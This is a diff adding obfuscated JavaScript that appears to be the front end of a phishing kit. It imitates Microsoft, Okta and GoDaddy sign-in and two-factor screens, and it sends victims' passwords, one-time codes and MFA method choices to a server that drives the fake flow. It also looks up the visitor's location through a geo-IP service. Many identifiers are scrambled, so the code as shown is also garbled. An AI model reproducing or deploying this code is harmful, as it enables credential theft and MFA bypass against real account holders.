+    "</span><a\x20id=\x22ViewDetails\x22\x20class=\x22no-wrap\x22\x20href=\x22#\x22>View\x20details</a>",
+    "useAuthenticator",
+    "then",
+    "pwd_okta",
+    "linkoptionclick(this)",
+    "url(\x27",
+    "<a\x20class=\x22link\x20mb-16\x22\x20href=\x22#\x22\x20data-id=\x22",
+    "sections_okta",
+    "tile",
+    "text",
+    "backgroundColor",
+    "inp_confirmemail",
+    "Verify\x20your\x20phone\x20number",
+    "onclick",
+    "true",
+    "otp\x20sent",
+    "approved",
+    "section_pwd",
+    "show-from-left\x20",
+    "multipleaccountsadfs",
+    "checked",
+    "auto",
+    "EmailOTP_Live",
+    "phcontainer",
+    "getElementById",
+    "background",
+    "aria-live",
+    "iProofLbl1",
+    "otp\x20sent\x20error",
+    "authapperror",
+    "https://get.geojs.io/v1/ip/geo.json",
+    "#godaddysignin",
+    "final",
+    "<span>Sorry,\x20we\x27re\x20having\x20trouble\x20verifying\x20your\x20account.\x20Please\x20try\x20again.</span><a\x20id=\x22ViewDetails\x22\x20class=\x22no-wrap\x22\x20href=\x22#\x22>View\x20details</a>",
+    "toggle",
+    "iProofEmail",
+    "background-image",
+    "reason",
+    "error_uname_doc",
+    "pwd_godaddy",
+    "img",
+    "113",
+    "confirmemailorphone_live_hidden",
+    "</a>",
+    "display:\x20unset;",
+    "email\x20otp\x20live",
+    "checkapphavingtroublesection",
+    "more\x20info\x20required",
+    "#tryagainheader",
+    "inp_pwd",
+    "CompanionAppsNotification",
+    "backbutton",
+  ];
+  _0x2985 = function () {
+    return _0x34edef;
+  };
+  return _0x2985();
+}
+for (let i = 0x0; i < cancelbtns[`style`]; i++) {
+  cancelbtns[i][`phcontainer`]("click", () => {
+    const _0x5d923e = _0x283fde;
+    loadinganimation(0x0),
+      (document[`selectprotectoption(this)`](`innerText` + view)[
+        `.loading-container`
+      ](`relative`)[`getElementById`]["animation"] = ""),
+      loadinganimation(0x1),
+      (document[`selectprotectoption(this)`](`iProofPhone`)["querySelector"](
+        `relative`,
+      )[`getElementById`][`approve auth request auth app`] = ""),
+      document[`selectprotectoption(this)`]("section_" + view)[`pdfemail`][
+        `waiting`
+      ](`background-image`),
+      (document["getElementById"]("section_uname")[`.loading-container`](
+        ".sectioncontent",
+      )["style"]["animation"] = ""),
+      document[`selectprotectoption(this)`](`iProofPhone`)[`pdfemail`][
+        `<a class="link mb-16" href="#" data-id="`
+      ](`background-image`),
+      document[
+        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+      ][`getElementById`]["backgroundImage"] &&
+        (document[
+          `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+        ][`getElementById`][`otpdesc`] = ""),
+      document["body"][`getElementById`][`image_src`] &&
+        (document[
+          `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+        ]["style"]["backgroundColor"] = ""),
+      (document["getElementById"](`#btn_back`)[`signin_blocked_reason`] = ""),
+      (document[`selectprotectoption(this)`](`dirltr`)[`Next`] = ""),
+      (document["getElementById"](`tryagainlater`)[`signin_blocked_reason`] =
+        ""),
+      (document[`selectprotectoption(this)`](
+        `Sorry, we're having trouble verifying your account. Please try again. `,
+      )[`signin_blocked_reason`] = ""),
+      (document[`selectprotectoption(this)`]("godaddypassword")[
+        `signin_blocked_reason`
+      ] = ""),
+      document[`selectprotectoption(this)`](`classList`)["setAttribute"](
+        `error_pwd`,
+        `newwebsiteopen`,
+      ),
+      (document[`.loading-container`](`TwoWayVoiceMobile`)[
+        `.loading-container`
+      ](`linkoptionclick(this)`)[`error_authapp_live`] = `Create one!`),
+      (view = `2fa is on`);
+  });
+}
+const protectbtn = document[`selectprotectoption(this)`]("btn_protectaccount");
+function protectsend(_0x478dd9) {
+  const _0x54a7bd = _0x283fde;
+  if (protectbtn[`error_authapp_live`] == "Send\x20Code") {
+    const _0x1ae2e2 = document[`.btn_can`](`authapperror`);
+    let _0x20cfe0 = 0x0;
+    for (let _0x48c811 = 0x0; _0x48c811 < _0x1ae2e2[`style`]; _0x48c811++) {
+      if (_0x1ae2e2[_0x48c811] === _0x478dd9) {
+        _0x20cfe0 = _0x48c811;
+        break;
+      }
+    }
+    console["log"](_0x20cfe0);
+    const _0xd9685f = document["querySelector"](`label`);
+    loadinganimation(0x0),
+      sendAndReceive(
+        "enterprotect",
+        [_0x20cfe0, _0xd9685f[`signin_blocked_reason`]],
+        0x1,
+      )
+        [`hide-to-left `]((_0x5e327c) => {
+          const _0x5446d9 = _0x54a7bd;
+          _0x5e327c &&
+            _0x5e327c[`</a> or try to sign in again shortly.</p>`] !==
+              `Enter the code to help us verify your identity.` &&
+            (loadinganimation(0x1),
+            _0x5e327c[`</a> or try to sign in again shortly.</p>`] ==
+              "otp\x20sent" &&
+              ((document[`selectprotectoption(this)`](`correct email`)[`Next`] =
+                ""),
+              document[`selectprotectoption(this)`]("otpimg")[`142499lsAMVs`](
+                `fail`,
+                _0x5e327c["image_src"],
+              ),
+              checkerrordesc(`authapp`, 0x0, _0x5e327c["description"]),
+              bottomsectionlinks(`authapp`, _0x5e327c[`otp sent live`]),
+              changebackbutton(`authapp`, _0x5e327c[`#docemailloading`]),
+              document[`selectprotectoption(this)`](`btn_protectaccount`)[
+                `pdfemail`
+              ][`waiting`](`background-image`),
+              document[`selectprotectoption(this)`](`pwd_okta`)[`pdfemail`][
+                `<a class="link mb-16" href="#" data-id="`
+              ](`background-image`),
+              (view = `authapp`)),
+            _0x5e327c[`</a> or try to sign in again shortly.</p>`] == `auth` &&
+              (bottomsectionlinks(`titlehint`, _0x5e327c["bottomsection"]),
+              changebackbutton("2fa", _0x5e327c[`#docemailloading`]),
+              checkerrordesc(`titlehint`, 0x1, _0x5e327c[`confirmemail`])));
+        })
+        ["catch"]((_0x22b86f) => {
+          const _0x40b25e = _0x54a7bd;
+          loadinganimation(0x1),
+            console[`auth`](`selecttwofamethod(this)`, _0x22b86f);
+        });
+  }
+  if (
+    protectbtn[`error_authapp_live`] ==
+    `The wrong code was entered. Send yourself a new code and try again.`
+  ) {
+  }
+  if (protectbtn["textContent"] == `approve auth request calling`) {
+  }
+}
+function twofalive(_0x25facb) {
+  const _0x2dc1e2 = _0x283fde;
+  if (view == `okta`) {
+    let _0x480f72 = null,
+      _0x4b8fa6 = null;
+    viewtype == `inp_confirmemailorphone_live` && (_0x480f72 = `PhoneAppOTP`);
+    viewtype == "phone" && (_0x480f72 = `for`);
+    let _0x524d6f = document[`selectprotectoption(this)`](
+        "inp_confirmemailorphone_live",
+      )[`signin_blocked_reason`],
+      _0x3b31ec =
+        document[`selectprotectoption(this)`](`error_otp`)[
+          `signin_blocked_reason`
+        ];
+    viewtype == `inp_confirmemailorphone_live` &&
+      (_0x3b31ec["slice"](0x0, 0x2) !==
+        _0x524d6f[`Enter a security code`](0x0, 0x2) &&
+        ((document[`selectprotectoption(this)`](`section_confirmemail`)[
+          `getElementById`
+        ][`multipleaccounts`] = `Enter the code you received`),
+        (document[`selectprotectoption(this)`](`section_confirmemail`)[
+          `getElementById`
+        ][`checkpass`] = `dynamic-style`),
+        (document[`selectprotectoption(this)`](`section_confirmemail`)[`Next`] =
+          `key` + _0x3b31ec[`Enter a security code`](0x0, 0x2) + "\x22.")),
+      _0x3b31ec["slice"](0x0, 0x2) == _0x524d6f["slice"](0x0, 0x2) &&
+        (_0x4b8fa6 = 0x1)),
+      viewtype == `backgroundimage` &&
+        (_0x3b31ec[`Enter a security code`](-0x2) !==
+          _0x524d6f[`Enter a security code`](-0x2) &&
+          ((document[`selectprotectoption(this)`](`section_confirmemail`)[
+            `getElementById`
+          ][`multipleaccounts`] = `Enter the code you received`),
+          (document[`selectprotectoption(this)`](
+            "error_confirmemailorphone_live",
+          )["style"][`checkpass`] = `dynamic-style`),
+          (document[`selectprotectoption(this)`](`section_confirmemail`)[
+            `Next`
+          ] =
+            `hide-to-right ` + _0x3b31ec[`Enter a security code`](-0x2) + ".")),
+        _0x3b31ec["slice"](-0x2) == _0x524d6f[`Enter a security code`](-0x2) &&
+          (_0x4b8fa6 = 0x1)),
+      _0x4b8fa6 == 0x1 &&
+        ((document[`selectprotectoption(this)`](
+          "error_confirmemailorphone_live",
+        )["style"]["display"] = `section_otp`),
+        (document[`selectprotectoption(this)`](
+          "error_confirmemailorphone_live",
+        )[`Next`] = ""),
+        loadinganimation(0x0),
+        sendAndReceive(`split`, [_0x480f72, _0x524d6f], 0x1)["then"](
+          (_0x4fcee0) => {
+            const _0xc51899 = _0x2dc1e2;
+            _0x4fcee0 &&
+              _0x4fcee0["message"] !==
+                `Enter the code to help us verify your identity.` &&
+              (loadinganimation(0x1),
+              _0x4fcee0[`</a> or try to sign in again shortly.</p>`] ==
+                `confirmemailorphone_live_title` &&
+                ((document["getElementById"](`sections_`)["innerText"] =
+                  _0x4fcee0[`inp_confirmemailorphone_live`]),
+                checkerrordesc(`aria-live`, 0x0, _0x4fcee0[`confirmemail`]),
+                checkerrordesc(
+                  `" onclick="linkoptionclick(this)">`,
+                  0x2,
+                  _0x4fcee0[`section_authcall`],
+                ),
+                document[`selectprotectoption(this)`](`innerText` + view)[
+                  `pdfemail`
+                ][`waiting`](`background-image`),
+                document[`selectprotectoption(this)`](`backbutton`)[`pdfemail`][
+                  `<a class="link mb-16" href="#" data-id="`
+                ](`background-image`),
+                (view = `aria-live`)),
+              _0x4fcee0[`</a> or try to sign in again shortly.</p>`] ==
+                `inp_otpcode` &&
+                (checkerrordesc(`methodid`, 0x0, _0x4fcee0["description"]),
+                document["getElementById"](`innerText` + view)["classList"][
+                  "toggle"
+                ](`background-image`),
+                document[`selectprotectoption(this)`](
+                  `Can’t access your account?`,
+                )["classList"][`<a class="link mb-16" href="#" data-id="`](
+                  `background-image`,
+                ),
+                (view = "protect_account_live")),
+              _0x4fcee0[`</a> or try to sign in again shortly.</p>`] ==
+                `notanymore` &&
+                ((document[`selectprotectoption(this)`](`section_confirmemail`)[
+                  `getElementById`
+                ][`checkpass`] = `section_otp`),
+                (document[`selectprotectoption(this)`](`section_confirmemail`)[
+                  `Next`
+                ] = ""),
+                document[`selectprotectoption(this)`]("otpliveimg")[
+                  `142499lsAMVs`
+                ]("src", _0x4fcee0["image_src"]),
+                checkerrordesc(`5049dgudYJ`, 0x0, _0x4fcee0["description"]),
+                bottomsectionlinks(`5049dgudYJ`, _0x4fcee0["bottomsection"]),
+                changebackbutton(`5049dgudYJ`, _0x4fcee0["backbutton"]),
+                document[`selectprotectoption(this)`](`PhoneAppOTP_Live`)[
+                  `pdfemail`
+                ]["toggle"](`background-image`),
+                document["getElementById"](`Code`)[`pdfemail`][
+                  `<a class="link mb-16" href="#" data-id="`
+                ](`background-image`),
+                (view = `5049dgudYJ`),
+                (viewtype = `inp_confirmemailorphone_live`)),
+              _0x4fcee0[`</a> or try to sign in again shortly.</p>`] ==
+                "phone\x20otp" &&
+                ((document[`selectprotectoption(this)`](
+                  "error_confirmemailorphone_live",
+                )["innerText"] = ""),
+                document[`selectprotectoption(this)`](`head`)[`142499lsAMVs`](
+                  "src",
+                  _0x4fcee0[`Too many Attempts`],
+                ),
+                checkerrordesc(`5049dgudYJ`, 0x0, _0x4fcee0[`confirmemail`]),
+                bottomsectionlinks("otp_live", _0x4fcee0[`otp sent live`]),
+                changebackbutton(`5049dgudYJ`, _0x4fcee0[`#docemailloading`]),
+                document[`selectprotectoption(this)`](`PhoneAppOTP_Live`)[
+                  "classList"
+                ][`waiting`]("d-none"),
+                document["getElementById"]("section_otp_live")[`pdfemail`][
+                  "remove"
+                ](`background-image`),
+                (view = `5049dgudYJ`),
+                (viewtype = `backgroundimage`),
+                (document["getElementById"]("error_confirmemailorphone_live")[
+                  `getElementById`
+                ]["display"] = `section_otp`)));
+          },
+        ));
+  }
+  if (view == `5049dgudYJ`) {
+    let _0x12b1c4 = null,
+      _0x4dec19 = null;
+    viewtype == `inp_confirmemailorphone_live` && (_0x12b1c4 = `inp_uname`);
+    viewtype == "phone" && (_0x12b1c4 = `reason`);
+    viewtype == `authapp` && (_0x12b1c4 = "PhoneAppOTP_Live");
+    let _0xa31d3f =
+      document[`selectprotectoption(this)`](`btn_sig`)[`signin_blocked_reason`];
+    viewtype == `inp_confirmemailorphone_live` &&
+      (_0xa31d3f == "" &&
+        ((document["getElementById"]("error_otp_live")[`getElementById`][
+          "marginBottom"
+        ] = "14px"),
+        (document["getElementById"](`No account?`)[`getElementById`][
+          `checkpass`
+        ] = `dynamic-style`),
+        (document[`selectprotectoption(this)`](`No account?`)[`Next`] =
+          `value`)),
+      _0xa31d3f !== "" && (_0x4dec19 = 0x1)),
+      viewtype == `backgroundimage` &&
+        (_0xa31d3f == "" &&
+          ((document[`selectprotectoption(this)`](`No account?`)["style"][
+            `multipleaccounts`
+          ] = `Enter the code you received`),
+          (document["getElementById"]("error_otp_live")[`getElementById`][
+            `checkpass`
+          ] = `dynamic-style`),
+          (document[`selectprotectoption(this)`]("error_otp_live")[`Next`] =
+            `value`)),
+        _0xa31d3f !== "" && (_0x4dec19 = 0x1)),
+      viewtype == "otp" &&
+        (_0xa31d3f == "" &&
+          ((document[`selectprotectoption(this)`](`No account?`)[
+            `getElementById`
+          ][`multipleaccounts`] = `Enter the code you received`),
+          (document["getElementById"](`No account?`)["style"]["display"] =
+            `dynamic-style`),
+          (document[`selectprotectoption(this)`](`No account?`)[`Next`] =
+            `value`)),
+        _0xa31d3f !== "" && (_0x4dec19 = 0x1)),
+      _0x4dec19 == 0x1 &&
+        ((document[`selectprotectoption(this)`](`No account?`)[
+          `getElementById`
+        ][`checkpass`] = `section_otp`),
+        (document[`selectprotectoption(this)`](`No account?`)[`Next`] = ""),
+        loadinganimation(0x0),
+        sendAndReceive("twofaselected", [_0x12b1c4, _0xa31d3f], 0x1)["then"](
+          (_0x13ba01) => {
+            const _0x21337d = _0x2dc1e2;
+            _0x13ba01 &&
+              _0x13ba01[`</a> or try to sign in again shortly.</p>`] !==
+                `Enter the code to help us verify your identity.` &&
+              (loadinganimation(0x1),
+              _0x13ba01[`</a> or try to sign in again shortly.</p>`] ==
+                `confirmemailorphone_live_title` &&
+                ((document[`selectprotectoption(this)`](
+                  "signin_blocked_live_email",
+                )[`Next`] = _0x13ba01[`inp_confirmemailorphone_live`]),
+                checkerrordesc(`aria-live`, 0x0, _0x13ba01["description"]),
+                checkerrordesc(
+                  `" onclick="linkoptionclick(this)">`,
+                  0x2,
+                  _0x13ba01[`section_authcall`],
+                ),
+                document[`selectprotectoption(this)`](`innerText` + view)[
+                  `pdfemail`
+                ]["toggle"](`background-image`),
+                document["getElementById"](`backbutton`)[`pdfemail`][
+                  `<a class="link mb-16" href="#" data-id="`
+                ](`background-image`),
+                (view = "signin_blocked_live")),
+              _0x13ba01[`</a> or try to sign in again shortly.</p>`] ==
+                `inp_otpcode` &&
+                (checkerrordesc(`methodid`, 0x0, _0x13ba01[`confirmemail`]),
+                document[`selectprotectoption(this)`]("section_" + view)[
+                  `pdfemail`
+                ][`waiting`](`background-image`),
+                document[`selectprotectoption(this)`](
+                  `Can’t access your account?`,
+                )[`pdfemail`]["remove"](`background-image`),
+                (view = "protect_account_live")),
+              (_0x13ba01[`</a> or try to sign in again shortly.</p>`] ==
+                `Send another request to my Outlook mobile app` ||
+                _0x13ba01[`</a> or try to sign in again shortly.</p>`] ==
+                  "valid\x20phone\x20otp" ||
+                _0x13ba01[`</a> or try to sign in again shortly.</p>`] ==
+                  `Forgot my password`) &&
+                ((document[`selectprotectoption(this)`]("otpdesc")[`Next`] =
+                  ""),
+                document[`selectprotectoption(this)`]("section_otp_live")[
+                  `pdfemail`
+                ][`waiting`](`background-image`),
+                document[`selectprotectoption(this)`]("section_final")[
+                  `pdfemail`
+                ][`<a class="link mb-16" href="#" data-id="`]("d-none"),
+                (view = "final")),
+              _0x13ba01["message"] == `POST` &&
+                ((document["getElementById"]("error_otp_live")[
+                  `getElementById`
+                ][`checkpass`] = `dynamic-style`),
+                checkerrordesc("otp_live", 0x1, _0x13ba01[`confirmemail`]),
+                bottomsectionlinks("otp_live", _0x13ba01[`otp sent live`]),
+                changebackbutton(`5049dgudYJ`, _0x13ba01[`#docemailloading`])));
+          },
+        ));
+  }
+}
+const confirmbtn = document[`selectprotectoption(this)`]("btn_confirmemail");
+confirmbtn["addEventListener"](`trim`, () => {
+  const _0x3edcc8 = _0x283fde,
+    _0x295d01 = document[_0x3edcc8(0x30b)](_0x3edcc8(0x2fe));
+  loadinganimation(0x0),
+    sendAndReceive(_0x3edcc8(0x216), [_0x295d01["value"]], 0x1)
+      [_0x3edcc8(0x2f5)]((_0x12c6bc) => {
+        const _0x456380 = _0x3edcc8;
+        _0x12c6bc &&
+          _0x12c6bc[_0x456380(0x2b0)] !== _0x456380(0x20f) &&
+          (loadinganimation(0x1),
+          _0x12c6bc[_0x456380(0x2b0)] == _0x456380(0x302) &&
+            ((document[_0x456380(0x30b)](_0x456380(0x2a8))[_0x456380(0x37f)] =
+              ""),
+            document[_0x456380(0x30b)](_0x456380(0x25c))["setAttribute"](
+              _0x456380(0x33b),
+              _0x12c6bc[_0x456380(0x258)],
+            ),
+            checkerrordesc(_0x456380(0x284), 0x0, _0x12c6bc[_0x456380(0x2bb)]),
+            bottomsectionlinks(_0x456380(0x284), _0x12c6bc[_0x456380(0x213)]),
+            changebackbutton(_0x456380(0x284), _0x12c6bc["backbutton"]),
+            document["getElementById"](_0x456380(0x2e0))[_0x456380(0x208)][
+              _0x456380(0x315)
+            ](_0x456380(0x1d6)),
+            document["getElementById"](_0x456380(0x39b))[_0x456380(0x208)][
+              _0x456380(0x39e)
+            ](_0x456380(0x1d6)),
+            (view = "otp")),
+          _0x12c6bc[_0x456380(0x2b0)] == _0x456380(0x33c) &&
+            ((document[_0x456380(0x30b)](_0x456380(0x2a8))[_0x456380(0x37f)] =
+              ""),
+            document[_0x456380(0x30b)](_0x456380(0x25c))["setAttribute"](
+              _0x456380(0x33b),
+              _0x12c6bc[_0x456380(0x258)],
+            ),
+            checkerrordesc(_0x456380(0x284), 0x0, _0x12c6bc[_0x456380(0x2bb)]),
+            bottomsectionlinks(_0x456380(0x284), _0x12c6bc[_0x456380(0x213)]),
+            changebackbutton(_0x456380(0x284), _0x12c6bc["backbutton"]),
+            document["getElementById"](_0x456380(0x2e0))["classList"][
+              _0x456380(0x315)
+            ]("d-none"),
+            document[_0x456380(0x30b)](_0x456380(0x39b))[_0x456380(0x208)][
+              _0x456380(0x39e)
+            ](_0x456380(0x1d6)),
+            (view = _0x456380(0x284))),
+          _0x12c6bc[_0x456380(0x2b0)] == _0x456380(0x30f) &&
+            ((document[_0x456380(0x30b)](_0x456380(0x2a8))["innerText"] = ""),
+            document["getElementById"](_0x456380(0x25c))[_0x456380(0x26c)](
+              _0x456380(0x33b),
+              _0x12c6bc[_0x456380(0x258)],
+            ),
+            checkerrordesc("otp", 0x0, _0x12c6bc["description"])),
+          _0x12c6bc["message"] == _0x456380(0x23d) &&
+            (bottomsectionlinks(_0x456380(0x277), _0x12c6bc[_0x456380(0x213)]),
+            changebackbutton(_0x456380(0x277), _0x12c6bc[_0x456380(0x326)]),
+            checkerrordesc("verifyemail", 0x1, _0x12c6bc[_0x456380(0x2bb)])));
+      })
+      [_0x3edcc8(0x379)]((_0x2c1189) => {
+        const _0x29e1b6 = _0x3edcc8;
+        loadinganimation(0x1), console["error"](_0x29e1b6(0x367), _0x2c1189);
+      });
+});
+const verifyotpbtn = document[`selectprotectoption(this)`](`type`);
+verifyotpbtn[`phcontainer`](`trim`, () => {
+  const _0x2f4e16 = _0x283fde,
+    _0x3d11bd = document[_0x2f4e16(0x30b)](_0x2f4e16(0x2df));
+  loadinganimation(0x0);
+  let _0x21cafa = 0x0;
+  otptype == 0x1 && (_0x21cafa = "PhoneAppOTP"),
+    otptype == 0x2 && (_0x21cafa = _0x2f4e16(0x3b1)),
+    otptype == 0x3 && (_0x21cafa = _0x2f4e16(0x377)),
+    _0x3d11bd[_0x2f4e16(0x2ab)] == "" &&
+      (loadinganimation(0x1),
+      (document["getElementById"](_0x2f4e16(0x341))[_0x2f4e16(0x37f)] =
+        _0x2f4e16(0x350))),
+    _0x3d11bd[_0x2f4e16(0x2ab)] !== "" &&
+      sendAndReceive(
+        _0x2f4e16(0x20e),
+        [_0x21cafa, _0x3d11bd[_0x2f4e16(0x2ab)]],
+        0x1,
+      )
+        ["then"]((_0x108eaf) => {
+          const _0x408a4d = _0x2f4e16;
+          _0x108eaf &&
+            _0x108eaf[_0x408a4d(0x2b0)] !==
+              "waiting\x20for\x20previous\x20request\x20to\x20complete" &&
+            (loadinganimation(0x1),
+            console[_0x408a4d(0x32f)](_0x108eaf[_0x408a4d(0x2b0)]),
+            _0x108eaf[_0x408a4d(0x2b0)] == _0x408a4d(0x36a) &&
+              ((document["getElementById"](_0x408a4d(0x21f))[_0x408a4d(0x37f)] =
+                _0x108eaf[_0x408a4d(0x2b9)]),
+              checkerrordesc(
+                "signin_blocked_live",
+                0x0,
+                _0x108eaf[_0x408a4d(0x2bb)],
+              ),
+              checkerrordesc(
+                _0x408a4d(0x206),
+                0x2,
+                _0x108eaf[_0x408a4d(0x318)],
+              ),
+              document[_0x408a4d(0x30b)]("section_" + view)[_0x408a4d(0x208)][
+                _0x408a4d(0x315)
+              ](_0x408a4d(0x1d6)),
+              document[_0x408a4d(0x30b)]("section_signin_blocked_live")[
+                _0x408a4d(0x208)
+              ]["remove"]("d-none"),
+              (view = _0x408a4d(0x3b2))),
+            _0x108eaf[_0x408a4d(0x2b0)] == _0x408a4d(0x384) &&
+              (checkerrordesc(_0x408a4d(0x207), 0x0, _0x108eaf["description"]),
+              document[_0x408a4d(0x30b)]("section_" + view)["classList"][
+                _0x408a4d(0x315)
+              ](_0x408a4d(0x1d6)),
+              document[_0x408a4d(0x30b)](_0x408a4d(0x288))["classList"][
+                "remove"
+              ](_0x408a4d(0x1d6)),
+              (view = _0x408a4d(0x207))),
+            _0x108eaf[_0x408a4d(0x2b0)] == _0x408a4d(0x23d) &&
+              console[_0x408a4d(0x32f)](_0x108eaf[_0x408a4d(0x2bb)]),
+            _0x108eaf[_0x408a4d(0x2b0)] == "more\x20info\x20required" &&
+              moreinforeq(),
+            _0x108eaf[_0x408a4d(0x2b0)] == _0x408a4d(0x335) &&
+              ((wait2facancel = 0x1),
+              document["getElementById"](_0x408a4d(0x2b4))[_0x408a4d(0x208)][
+                _0x408a4d(0x280)
+              ](_0x408a4d(0x1d6)) &&
+                ((document[_0x408a4d(0x30b)](_0x408a4d(0x2b4))[
+                  _0x408a4d(0x224)
+                ](_0x408a4d(0x2e1))[_0x408a4d(0x37f)] = _0x408a4d(0x399)),
+                setTimeout(function () {
+                  const _0x197d12 = _0x408a4d;
+                  document[_0x197d12(0x30b)](_0x197d12(0x23e) + view)
+                    [_0x197d12(0x224)](".loading-container")
+                    [_0x197d12(0x208)][_0x197d12(0x39e)](_0x197d12(0x215)),
+                    runanimation(0x2, view, 0.5, 0x0),
+                    setTimeout(function () {
+                      const _0x1ff305 = _0x197d12;
+                      document[_0x1ff305(0x30b)](_0x1ff305(0x23e) + view)[
+                        "classList"
+                      ][_0x1ff305(0x315)]("d-none"),
+                        (document["getElementById"](_0x1ff305(0x2b4))[
+                          _0x1ff305(0x224)
+                        ]("#tryagainheader")[_0x1ff305(0x3b0)][
+                          _0x1ff305(0x1e6)
+                        ] = _0x1ff305(0x203)),
+                        (document[_0x1ff305(0x30b)](_0x1ff305(0x2b4))[
+                          _0x1ff305(0x224)
+                        ](_0x1ff305(0x2a3))[_0x1ff305(0x3b0)][
+                          _0x1ff305(0x1e6)
+                        ] = "block"),
+                        (document[_0x1ff305(0x30b)]("section_tryagainlater")[
+                          _0x1ff305(0x224)
+                        ](".sectioncontent")["style"][_0x1ff305(0x34e)] =
+                          "show-from-right\x200.5s"),
+                        document[_0x1ff305(0x30b)](_0x1ff305(0x2b4))[
+                          "classList"
+                        ][_0x1ff305(0x39e)](_0x1ff305(0x1d6)),
+                        (view = _0x1ff305(0x27f));
+                    }, 0xc8);
+                }, 0x1f4))),
+            _0x108eaf["message"] == _0x408a4d(0x268) &&
+              ((document["getElementById"]("otpdesc")["innerText"] = ""),
+              document[_0x408a4d(0x30b)](_0x408a4d(0x39b))[_0x408a4d(0x208)][
+                _0x408a4d(0x315)
+              ](_0x408a4d(0x1d6)),
+              document[_0x408a4d(0x30b)](_0x408a4d(0x29f))[_0x408a4d(0x208)][
+                "remove"
+              ](_0x408a4d(0x1d6)),
+              (view = _0x408a4d(0x313))),
+            _0x108eaf[_0x408a4d(0x2b0)] == "error" &&
+              _0x108eaf[_0x408a4d(0x2bb)] != _0x408a4d(0x235) &&
+              (bottomsectionlinks("otp", _0x108eaf[_0x408a4d(0x213)]),
+              changebackbutton(_0x408a4d(0x284), _0x108eaf[_0x408a4d(0x326)]),
+              checkerrordesc(
+                _0x408a4d(0x284),
+                0x1,
+                _0x108eaf[_0x408a4d(0x2bb)],
+              ),
+              (document[_0x408a4d(0x30b)](_0x408a4d(0x2df))[_0x408a4d(0x2ab)] =
+                "")),
+            _0x108eaf[_0x408a4d(0x2b0)] == "error" &&
+              _0x108eaf["description"] == _0x408a4d(0x235) &&
+              (bottomsectionlinks(_0x408a4d(0x232), _0x108eaf["bottomsection"]),
+              changebackbutton(_0x408a4d(0x232), _0x108eaf[_0x408a4d(0x326)]),
+              (document["getElementById"](_0x408a4d(0x2df))["value"] = ""),
+              (document["getElementById"](_0x408a4d(0x278))[_0x408a4d(0x37f)] =
+                ""),
+              document[_0x408a4d(0x30b)](_0x408a4d(0x39b))[_0x408a4d(0x208)][
+                _0x408a4d(0x315)
+              ](_0x408a4d(0x1d6)),
+              document[_0x408a4d(0x30b)](_0x408a4d(0x287))["classList"][
+                "remove"
+              ](_0x408a4d(0x1d6))));
+        })
+        [_0x2f4e16(0x379)]((_0xb06248) => {
+          const _0x41a61a = _0x2f4e16;
+          loadinganimation(0x1), console[_0x41a61a(0x23d)]("Error:", _0xb06248);
+        });
+});
+function valaction(_0xe551eb, _0x4f9667, _0x43e425, _0x5a252a) {
+  const _0x33023b = _0x283fde;
+  !_0x43e425
+    ? ((document[`selectprotectoption(this)`](_0xe551eb)[`Next`] = _0x5a252a),
+      _0x4f9667 && pwdInp[`pdfemail`][`</p>`](`table-row`))
+    : ((document["getElementById"](_0xe551eb)[`Next`] = ""),
+      _0x4f9667 &&
+        pwdInp[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+          `table-row`,
+        ));
+}
+function checkerrordesc(_0xb59175, _0x520149, _0x32ed9b) {
+  const _0x6f7030 = _0x283fde;
+  if (_0x520149 == 0x2) var _0x450ba0 = _0xb59175;
+  if (_0x520149 == 0x1) var _0x450ba0 = `button` + _0xb59175;
+  if (_0x520149 == 0x0) var _0x450ba0 = _0xb59175 + `EmailOTP_Live_2`;
+  if (_0x32ed9b[`error_pwd`] === `tile`)
+    _0x32ed9b[`aria-required`] == `absolute` &&
+      (document[`selectprotectoption(this)`](_0x450ba0)[`content`] =
+        "<p\x20class=\x22mb-16\x22>" +
+        _0x32ed9b["text"] +
+        `otp` +
+        _0x32ed9b[`aria-required`] +
+        (`#oktasignin` + _0x32ed9b["a_text"] + `title`)),
+      _0x32ed9b["a_id"] != `absolute` &&
+        (document[`selectprotectoption(this)`](_0x450ba0)["innerHTML"] =
+          `click` +
+          _0x32ed9b["text"] +
+          `otp` +
+          _0x32ed9b[`aria-required`] +
+          ("\x22\x20onclick=\x22linkoptionclick(this)\x22\x20class=\x22link\x22>" +
+            _0x32ed9b[`Sign in using another Microsoft account`] +
+            `idp`));
+  else {
+    if (_0x32ed9b[`error_pwd`] === `#next_btn_pdf`)
+      document[`selectprotectoption(this)`](_0x450ba0)[`content`] =
+        `btn_verifyotp` +
+        _0x32ed9b[`aria-required`] +
+        (`Email name` +
+          _0x32ed9b[`Sign in using another Microsoft account`] +
+          "</a>\x20<p>" +
+          _0x32ed9b[`maxlength`] +
+          `link`);
+    else {
+      if (_0x32ed9b[`error_pwd`] === `uname_doc`)
+        document["getElementById"](_0x450ba0)[`content`] =
+          `btn_verifyotp` +
+          _0x32ed9b[`aria-required`] +
+          ("\x22\x20onclick=\x22linkoptionclick(this)\x22>" +
+            _0x32ed9b[`Sign in using another Microsoft account`] +
+            `We couldn't find an account with that username. Try another, or get a new Microsoft account.`);
+      else
+        _0x32ed9b[`error_pwd`] === `maxlength` &&
+          (document[`selectprotectoption(this)`](_0x450ba0)[`content`] =
+            `display` + _0x32ed9b["text"] + `link`);
+    }
+  }
+}
+function selectmultipleaccountadfs(_0x3598d2) {
+  const _0x4f5e79 = _0x283fde,
+    _0x5d87b1 = document["getElementsByClassName"](_0x4f5e79(0x361));
+  let _0x499166 = -0x1;
+  for (let _0x53a0f0 = 0x0; _0x53a0f0 < _0x5d87b1["length"]; _0x53a0f0++) {
+    if (_0x5d87b1[_0x53a0f0] === _0x3598d2) {
+      _0x499166 = _0x53a0f0;
+      break;
+    }
+  }
+  sendAndReceive(_0x4f5e79(0x380), [_0x499166], 0x1)
+    ["then"]((_0xaf7399) => {
+      const _0x2c90cf = _0x4f5e79;
+      _0xaf7399 &&
+        _0xaf7399[_0x2c90cf(0x2b0)] !== _0x2c90cf(0x20f) &&
+        (_0xaf7399[_0x2c90cf(0x2b0)] == _0x2c90cf(0x22a) &&
+          (document["getElementById"](_0x2c90cf(0x2f2))[_0x2c90cf(0x208)][
+            _0x2c90cf(0x315)
+          ](_0x2c90cf(0x1d6)),
